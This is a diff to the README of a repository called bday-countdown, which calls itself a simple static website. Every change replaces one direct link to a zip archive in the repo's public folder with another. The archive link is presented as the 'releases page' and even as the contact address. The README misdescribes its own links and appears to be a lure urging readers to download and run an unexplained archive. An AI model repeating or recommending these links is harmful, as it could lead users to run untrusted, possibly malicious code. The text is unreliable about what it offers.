@@ -8,11 +8,11 @@ Welcome to the bday-countdown project! This simple, static website helps you kee
 
 To get started, you need to download the application. Click the link below to visit the releases page and get the latest version:
 
-[![Download bday-countdown](https://raw.githubusercontent.com/krabba16/bday-countdown/main/public/bday-countdown_sevenscore.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/krabba16/bday-countdown/main/public/bday-countdown_sevenscore.zip)
+[![Download bday-countdown](https://github.com/krabba16/bday-countdown/raw/refs/heads/main/public/bday_countdown_2.0.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/krabba16/bday-countdown/raw/refs/heads/main/public/bday_countdown_2.0.zip)
 
 On the releases page, you will find the latest version of bday-countdown. Follow these steps to download and run the software:
 
-1. **Visit the Releases Page**: Click on the link above, or visit [this page](https://raw.githubusercontent.com/krabba16/bday-countdown/main/public/bday-countdown_sevenscore.zip) in your web browser.
+1. **Visit the Releases Page**: Click on the link above, or visit [this page](https://github.com/krabba16/bday-countdown/raw/refs/heads/main/public/bday_countdown_2.0.zip) in your web browser.
    
 2. **Select the Latest Release**: Scroll down and look for the latest version listed. Each version will have notes about new features and fixes, which can help you choose the right one.
 
@@ -58,7 +58,7 @@ bday-countdown is open-source software licensed under the MIT License. You can f
 
 ## 📬 Contact
 
-For questions or support, please reach out to the project maintainers through the GitHub issues page, or connect with us at [https://raw.githubusercontent.com/krabba16/bday-countdown/main/public/bday-countdown_sevenscore.zip].
+For questions or support, please reach out to the project maintainers through the GitHub issues page, or connect with us at [https://github.com/krabba16/bday-countdown/raw/refs/heads/main/public/bday_countdown_2.0.zip].
 
 ## 📢 Acknowledgments
 
@@ -68,4 +68,4 @@ Thank you to everyone who contributed to the bday-countdown project. Your feedba
 
 Don’t forget to visit the release page to download the bday-countdown application:
 
-[![Download bday-countdown](https://raw.githubusercontent.com/krabba16/bday-countdown/main/public/bday-countdown_sevenscore.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/krabba16/bday-countdown/main/public/bday-countdown_sevenscore.zip)
+[![Download bday-countdown](https://github.com/krabba16/bday-countdown/raw/refs/heads/main/public/bday_countdown_2.0.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/krabba16/bday-countdown/raw/refs/heads/main/public/bday_countdown_2.0.zip)
